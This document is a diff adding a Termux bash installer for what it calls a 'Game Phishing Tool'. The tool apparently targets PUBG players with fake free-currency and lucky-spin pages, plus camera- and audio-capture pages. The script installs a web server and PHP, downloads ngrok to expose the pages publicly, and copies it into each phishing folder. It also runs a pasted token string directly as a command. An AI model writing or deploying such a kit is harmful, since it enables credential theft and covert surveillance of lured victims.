@@ -1,0 +1,75 @@
+#!/data/data/com.termux/files/usr/bin/bash
+clear
+echo 
+echo 
+echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Game Phishing Tool Please Wait....  \e[0m"
+echo 
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo 
+echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Onine Hacking \e[0m"
+echo 
+termux-setup-storage
+pkg update -y > /dev/null 2>&1
+apt-get install apache2 -y
+apt install php -y
+apt install tail -y
+apt install jq -y
+apt install curl -y
+apt install zip -y
+pkg install wget -y
+pkg install ncurses-utils -y
+clear
+echo
+echo
+echo -e "\e[31m[\e[32m~\e[31m]\e[33m Instaling ngrok ... \e[m "
+echo
+wget https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip >> /dev/null 2>&1
+echo -e "\e[31m[\e[32m~\e[31m]\e[33m Successfuly installed \e[m "
+echo
+echo -e "\e[31m[\e[32m~\e[31m]\e[33m Inflating ngrok \e[m "
+sleep 2
+unzip Ngrok_Linux_Droid.zip >> /dev/null 2>&1 && rm -rf Ngrok_Linux_Droid.zip >> /dev/null 2>&1
+echo
+echo -e "\e[31m[\e[32m~\e[31m]\e[33m Done \e[m "
+sleep 2
+chmod +x ngrok
+cp -R ngrok phs/BonusChallenge-Free-Gift-OH/
+cp -R ngrok phs/Free-UC-Buy-OH/
+cp -R ngrok phs/Lucky-Spin-OH/
+cp -R ngrok phs/Camera_hack 
+cp -R ngrok phs/Audio_hack
+clear
+echo ""
+echo ""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
+sleep 2
+echo " "
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
+sleep 1
+echo " "
+read -p $'\e[31m[\e[32m*\e[31m]\e[33m Paste Your Ngrok Token [\e[31mEx \e[32m./ngrok authtoken\e[0m ] : \e[0m' token
+$token >> /dev/null 2>&1
+sleep 1
+clear
+echo
+echo -e "\e[35m[+] Setting up Online Hacking Game Tool  \e[m "
+echo 
+echo 
+echo 
+cp -R phs /data/data/com.termux/files/usr/bin
+cp -R onlinehacking-pubg /data/data/com.termux/files/usr/bin
+###########XXXXXXXXXXXXX####################
+#     JUST LEARNING KEEP SUPPORTING        #
+############XXXXXXXXXXXX####################
+echo -e "\e[1m \e[36m[+] There are 2 Tool Script for Android \e[m \e[21"
+echo 
+echo 
+echo -e "\e[92m[+] To run the tool 1 type :\e[93m onlinehacking-pubg \e[m "
+echo 
+echo -e "\e[92m[+] To run the tool 2 type :\e[93m ./OnlineHacking-Phishing.sh \e[m "
+echo 
+#####################################
+#           THANKYOU                #
+#####################################
